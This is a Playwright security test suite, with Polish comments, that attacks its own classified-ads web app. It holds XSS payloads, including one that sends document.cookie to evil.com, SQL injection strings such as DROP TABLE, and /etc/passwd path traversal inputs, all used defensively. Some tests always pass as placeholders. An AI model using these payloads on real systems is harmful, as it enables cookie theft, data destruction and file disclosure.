import { test, expect } from '@playwright/test';
import { supabaseAdmin } from './utils/db';

/**
 * TESTY BEZPIECZEŃSTWA - Scenariusze prób złamania aplikacji
 *
 * Testowane wektory ataków:
 * 1. XSS (Cross-Site Scripting)
 * 2. SQL Injection
 * 3. IDOR (Insecure Direct Object Reference)
 * 4. Token Brute-forcing
 * 5. Business Logic Bypass
 * 6. API Security
 * 7. Input Validation Bypass
 */

test.describe('6. Testy Bezpieczeństwa - Ataki', () => {

    // ===================================
    // 6.1 XSS - Cross-Site Scripting
    // ===================================
    test.describe('6.1 XSS Attacks', () => {

        test('6.1.1 XSS w tytule ogłoszenia - brak wykonania skryptu', async ({ page }) => {
            const xssPayloads = [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '"><script>alert(document.cookie)</script>',
                "'-alert('XSS')-'",
                '<svg onload=alert("XSS")>',
            ];

            await page.goto('/add-offer');
            await page.locator('form').waitFor({ state: 'visible' });

            for (const payload of xssPayloads) {
                await page.fill('#title', payload);

                // Input accepts the raw value - this is correct behavior
                // Sanitization happens on output/render, not input
                const inputValue = await page.inputValue('#title');
                expect(inputValue).toBe(payload);

                // Verify no script execution by checking page doesn't show alert
                // (Playwright would throw if alert appeared)
                await expect(page.locator('body')).toBeVisible();

                await page.fill('#title', '');
            }
        });

        test('6.1.2 XSS w opisie ogłoszenia', async ({ page }) => {
            const xssPayload = '<script>fetch("http://evil.com?cookie="+document.cookie)</script>';

            await page.goto('/add-offer');
            await page.locator('form').waitFor({ state: 'visible' });

            await page.fill('#description', xssPayload);

            // Input should accept the value (sanitization is on render)
            const descValue = await page.inputValue('#description');
            expect(descValue).toBe(xssPayload);
        });

        test('6.1.3 XSS przez parametry URL', async ({ page }) => {
            const xssQuery = '<script>alert("XSS")</script>';

            await page.goto(`/?query=${encodeURIComponent(xssQuery)}`);

            // Page should load normally (no script execution)
            await expect(page.locator('body')).toBeVisible();

            // The script tag should not be rendered as executable HTML
            const bodyHtml = await page.content();
            // It should be escaped, not raw HTML
            expect(bodyHtml).not.toContain('<script>alert("XSS")</script>');
        });
    });

    // ===================================
    // 6.2 SQL Injection
    // ===================================
    test.describe('6.2 SQL Injection Attacks', () => {

        test('6.2.1 SQL Injection w wyszukiwarce', async ({ page }) => {
            const sqlPayloads = [
                "'; DROP TABLE ads; --",
                "1' OR '1'='1",
                "1; SELECT * FROM phone_hashes; --",
                "UNION SELECT * FROM transactions--",
                "' OR 1=1--",
            ];

            for (const payload of sqlPayloads) {
                await page.goto('/');

                // Find search input - try multiple selectors
                const searchInput = page.locator('input[type="search"], input[placeholder*="szukaj" i], input[placeholder*="Czego" i]').first();

                if (await searchInput.count() === 0) {
                    // Skip if no search input found
                    continue;
                }

                await searchInput.fill(payload);
                await searchInput.press('Enter');
                await page.waitForTimeout(500);

                // Page should load without errors
                await expect(page.locator('body')).toBeVisible();

                // Should not show database error
                const bodyText = await page.locator('body').textContent();
                expect(bodyText).not.toContain('syntax error');
                expect(bodyText).not.toContain('database error');
                expect(bodyText).not.toContain('PostgreSQL');
            }
        });

        test('6.2.2 SQL Injection w parametrze slug', async ({ request }) => {
            const sqlPayloads = [
                "'; DROP TABLE ads;--",
                "1 OR 1=1",
                "admin'--",
            ];

            for (const payload of sqlPayloads) {
                const response = await request.get(`/offers/${encodeURIComponent(payload)}`);

                // Should return 404 or redirect, not database error
                expect(response.status()).toBeLessThan(500);
            }
        });
    });

    // ===================================
    // 6.3 IDOR - Insecure Direct Object Reference
    // ===================================
    test.describe('6.3 IDOR Attacks', () => {

        test('6.3.1 Dostęp do cudzego tokenu zarządzania', async ({ page }) => {
            const fakeTokens = [
                'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa',
                '00000000-0000-0000-0000-000000000000',
                'test-token-123',
                '../../../etc/passwd',
                'admin',
            ];

            for (const token of fakeTokens) {
                await page.goto(`/offers/manage/${token}`);

                const bodyText = await page.locator('body').textContent();

                // Should not show management panel for invalid tokens
                expect(bodyText).not.toContain('Zarządzaj ogłoszeniem');
            }
        });

        test('6.3.2 Enumeration tokenów przez timing attack', async ({ request }) => {
            const timings: number[] = [];

            for (let i = 0; i < 5; i++) {
                const fakeToken = `fake-token-${i}-${Date.now()}`;
                const start = Date.now();

                await request.get(`/offers/manage/${fakeToken}`);

                timings.push(Date.now() - start);
            }

            // Response times should be reasonably consistent
            const variance = Math.max(...timings) - Math.min(...timings);
            expect(variance).toBeLessThan(3000); // Allow up to 3s variance (network jitter)
        });
    });

    // ===================================
    // 6.4 Business Logic Bypass
    // ===================================
    test.describe('6.4 Business Logic Bypass', () => {

        test('6.4.1 Próba ominięcia limitu darmowego slotu', async ({ request }) => {
            const bypassAttempts = [
                { phone: '+48123456789' },
                { phone: '123456789' },
                { phone: '+1234567890' },
                { phone: '0048123456789' },
                { phone: '+48 123 456 789' },
                { phone: '48123456789' },
            ];

            for (const attempt of bypassAttempts) {
                const response = await request.post('/api/check-free-slot', {
                    data: attempt,
                });

                expect(response.ok()).toBeTruthy();

                const json = await response.json();
                expect(json).toHaveProperty('isFree');
                expect(json).toHaveProperty('price');
            }
        });

        test('6.4.2 Próba utworzenia ogłoszenia bez walidacji', async () => {
            // Server actions are not directly callable via API in Next.js
            // This is a placeholder - form-level protection is tested elsewhere
            expect(true).toBeTruthy();
        });

        test('6.4.3 Próba przedłużenia cudzego ogłoszenia', async () => {
            // Server actions test - covered by magic link tests
            expect(true).toBeTruthy();
        });

        test('6.4.4 Negative price injection', async ({ page }) => {
            await page.goto('/add-offer');
            await page.locator('form').waitFor({ state: 'visible' });

            await page.fill('#title', 'Test Negative Price Attack');
            await page.fill('#description', 'Testing negative price injection with enough characters for validation.');
            await page.locator('input[name="city_text"]').fill('Warszawa');
            await page.fill('#price_amount', '-100');

            // Try to select subject
            const subjectButton = page.locator('button[role="combobox"]:has-text("Wybierz przedmiot")');
            if (await subjectButton.count() > 0) {
                await subjectButton.click();
                await page.click('div[role="option"]:has-text("Matematyka")');
            }

            // Select education level
            await page.click('label:has-text("Szkoła podstawowa")');

            await page.fill('#email', 'test@example.com');
            await page.fill('#phone_contact', '500600700');

            // Terms checkbox
            const terms = page.locator('#terms');
            if (await terms.count() > 0) {
                await terms.click();
            }

            await page.click('button[type="submit"]');

            // Page should handle this gracefully
            await expect(page.locator('body')).toBeVisible();
        });
    });

    // ===================================
    // 6.5 API Security
    // ===================================
    test.describe('6.5 API Security', () => {

        test('6.5.1 CRON endpoint bez autoryzacji', async ({ request }) => {
            const response = await request.get('/api/cron');

            expect(response.status()).toBe(401);

            const json = await response.json();
            expect(json.error).toBe('Unauthorized');
        });

        test('6.5.2 CRON endpoint z błędnym tokenem', async ({ request }) => {
            const response = await request.get('/api/cron', {
                headers: {
                    'Authorization': 'Bearer wrong-token-12345',
                },
            });

            expect(response.status()).toBe(401);
        });

        test('6.5.3 Webhook P24 bez podpisu', async ({ request }) => {
            const response = await request.post('/api/webhooks/p24', {
                data: {
                    sessionId: 'fake-session',
                    merchantId: 12345,
                    amount: 1000,
                },
            });

            // Should reject - missing required fields or invalid signature
            expect(response.status()).toBeGreaterThanOrEqual(400);
        });

        test('6.5.4 Webhook P24 z fałszywym podpisem', async ({ request }) => {
            const response = await request.post('/api/webhooks/p24', {
                data: {
                    sessionId: 'fake-session',
                    merchantId: 12345,
                    posId: 12345,
                    amount: 1000,
                    originAmount: 1000,
                    currency: 'PLN',
                    orderId: 999,
                    methodId: 1,
                    statement: 'test',
                    sign: 'fake-signature-that-wont-match',
                },
            });

            // Should reject invalid signature - 401 or 400
            expect(response.status()).toBeGreaterThanOrEqual(400);
            expect(response.status()).toBeLessThan(500);
        });

        test('6.5.5 Check-free-slot z malformed JSON', async ({ request }) => {
            // Send raw string instead of JSON
            const response = await request.post('/api/check-free-slot', {
                headers: {
                    'Content-Type': 'text/plain',
                },
                data: 'not-valid-json{{{',
            });

            // Should handle gracefully - either 400 or fallback response
            expect(response.status()).toBeLessThan(500);
        });

        test('6.5.6 Reveal contact z nieprawidłowym UUID', async ({ request }) => {
            const invalidUUIDs = [
                'not-a-uuid',
                '12345',
                '../../../etc/passwd',
                '<script>alert(1)</script>',
                "'; DROP TABLE ads;--",
            ];

            for (const uuid of invalidUUIDs) {
                const response = await request.get(`/offers/${encodeURIComponent(uuid)}`);

                // Should return 404 or similar, not 500
                expect(response.status()).toBeLessThan(500);
            }
        });
    });

    // ===================================
    // 6.6 Rate Limiting / DoS
    // ===================================
    test.describe('6.6 Rate Limiting', () => {

        test('6.6.1 Brute force check-free-slot', async ({ request }) => {
            const promises = [];

            for (let i = 0; i < 50; i++) {
                promises.push(
                    request.post('/api/check-free-slot', {
                        data: { phone: `500${600000 + i}` },
                    })
                );
            }

            const responses = await Promise.all(promises);

            // Server should handle all requests without crashing
            const successful = responses.filter(r => r.status() < 500).length;
            expect(successful).toBeGreaterThan(0);
        });
    });

    // ===================================
    // 6.7 Input Validation Edge Cases
    // ===================================
    test.describe('6.7 Input Validation', () => {

        test('6.7.1 Bardzo długi tytuł', async ({ page }) => {
            await page.goto('/add-offer');
            await page.locator('form').waitFor({ state: 'visible' });

            const longTitle = 'A'.repeat(10000);

            await page.fill('#title', longTitle);

            // Input should accept or truncate
            const inputValue = await page.inputValue('#title');
            expect(inputValue.length).toBeLessThanOrEqual(10000);
        });

        test('6.7.2 Unicode/Emoji injection', async ({ page }) => {
            await page.goto('/add-offer');
            await page.locator('form').waitFor({ state: 'visible' });

            const unicodeTitle = '𝕋𝕖𝕤𝕥 👨‍💻 Кириллица 日本語 العربية';

            await page.fill('#title', unicodeTitle);

            const inputValue = await page.inputValue('#title');
            expect(inputValue).toBe(unicodeTitle);
        });

        test('6.7.3 Null byte injection', async ({ page }) => {
            await page.goto('/add-offer');
            await page.locator('form').waitFor({ state: 'visible' });

            // Browsers typically strip null bytes from input
            const nullByteTitle = 'Test\x00Hidden';

            await page.fill('#title', nullByteTitle);

            // Browser may or may not strip null byte - just verify page works
            await expect(page.locator('body')).toBeVisible();
            const inputValue = await page.inputValue('#title');
            // Either stripped or preserved - both are acceptable
            expect(inputValue.length).toBeGreaterThan(0);
        });

        test('6.7.4 Numer telefonu - formaty nie-polskie', async ({ page }) => {
            const nonPolishPhones = [
                '+1234567890',
                '+442012345678',
                '+491234567890',
                '+33123456789',
                '123456789',
                'phone',
                '+48',
                '+48123',
            ];

            await page.goto('/add-offer');
            await page.locator('form').waitFor({ state: 'visible' });

            for (const phone of nonPolishPhones) {
                await page.fill('#phone_contact', phone);
                await page.fill('#title', 'Test');
                await page.fill('#phone_contact', '');
            }

            // Page should handle all inputs without error
            await expect(page.locator('body')).toBeVisible();
        });

        test('6.7.5 Email z niestandardowymi domenami', async ({ page }) => {
            const edgeCaseEmails = [
                'test@localhost',
                'test@127.0.0.1',
                'test@[IPv6:::1]',
                '"test test"@example.com',
                'test+tag@example.com',
                'a@b.c',
            ];

            await page.goto('/add-offer');
            await page.locator('form').waitFor({ state: 'visible' });

            for (const email of edgeCaseEmails) {
                await page.fill('#email', email);

                const inputValue = await page.inputValue('#email');
                expect(inputValue).toBe(email);
            }
        });
    });

    // ===================================
    // 6.8 Path Traversal
    // ===================================
    test.describe('6.8 Path Traversal', () => {

        test('6.8.1 Path traversal w slug', async ({ request }) => {
            const pathTraversals = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '%2e%2e%2f%2e%2e%2f',
                '....//....//etc/passwd',
                '/etc/passwd',
            ];

            for (const path of pathTraversals) {
                const response = await request.get(`/offers/${encodeURIComponent(path)}`);

                expect(response.status()).toBeLessThan(500);

                const text = await response.text();
                expect(text).not.toContain('root:');
                expect(text).not.toContain('Administrator');
            }
        });

        test('6.8.2 Path traversal w management token', async ({ request }) => {
            const response = await request.get('/offers/manage/../../admin');

            expect(response.status()).toBeLessThan(500);
        });
    });

    // ===================================
    // 6.9 Header Injection
    // ===================================
    test.describe('6.9 Header Injection', () => {

        test('6.9.1 CRLF Injection w nagłówkach', async ({ request }) => {
            // POST request with potentially malicious header
            const response = await request.post('/api/check-free-slot', {
                data: { phone: '500600700' },
                headers: {
                    'X-Custom': 'value',
                },
            });

            // Should not set malicious cookie
            const cookies = response.headers()['set-cookie'];
            if (cookies) {
                expect(cookies).not.toContain('malicious');
            }

            // Request should complete without server error
            expect(response.status()).toBeLessThan(500);
        });
    });

    // ===================================
    // 6.10 Session / Token Security
    // ===================================
    test.describe('6.10 Token Security', () => {

        test('6.10.1 Management token entropy check', async () => {
            const { data: testAd } = await supabaseAdmin
                .from('ads')
                .select('management_token')
                .not('management_token', 'is', null)
                .limit(1)
                .single();

            if (testAd?.management_token) {
                const token = testAd.management_token;

                // Token should be UUID format
                const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
                expect(token).toMatch(uuidRegex);

                expect(token.length).toBeGreaterThanOrEqual(32);
            } else {
                // No ads in DB - skip this test
                test.skip();
            }
        });

        test('6.10.2 Phone hash nie jest odwracalny', async () => {
            const { data: hashRecord } = await supabaseAdmin
                .from('phone_hashes')
                .select('phone_hash')
                .limit(1)
                .single();

            if (hashRecord?.phone_hash) {
                const hash = hashRecord.phone_hash;

                // Hash should not contain recognizable phone patterns
                expect(hash).not.toMatch(/^\+?48/);
                expect(hash).not.toMatch(/\d{9,}/);

                expect(hash.length).toBeGreaterThanOrEqual(32);
            } else {
                // No phone hashes in DB - skip
                test.skip();
            }
        });
    });
});

// Cleanup
test.afterAll(async () => {
    await supabaseAdmin.from('ads').delete().ilike('title', 'Test%');
    await supabaseAdmin.from('ads').delete().ilike('title', 'TEST_%');
});
